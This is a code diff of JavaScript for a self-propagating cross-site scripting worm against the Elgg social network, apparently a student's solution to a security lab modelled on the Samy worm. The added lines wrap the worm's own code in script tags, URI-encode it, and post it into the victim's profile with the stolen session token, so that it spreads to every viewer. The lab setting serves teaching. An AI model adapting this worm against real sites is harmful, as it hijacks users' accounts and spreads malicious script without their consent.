@@ -43,13 +43,20 @@ var elggToken = elgg.security.token.__elgg_token;
     scriptElement.type = 'text/javascript';
     scriptElement.innerHTML = document.getElementById("worm").innerHTML;
 
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>";
+  
+  //Put it all together with URI encoding
+  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
     // URL encode the malicious JavaScript worm
-    var encodedScript = encodeURIComponent(scriptElement.innerHTML);
+    var encodedScript = encodeURIComponent(scriptElement);
     var wormPropagationUrl = "http://www.xsslabelgg.com/action/profile/edit";
     var wormContent = "guid=" + victimGuid
     + "&__elgg_token=" + elggToken
     + "&__elgg_ts=" + elggTs
-    + "&description=" + encodedScript;
+    + "&description=Samy is my HERO (added by Thunga Geethika)" + wormCode;
 
     // Send the encoded worm as a POST request to propagate it
     if (victimGuid !== samyGuid){
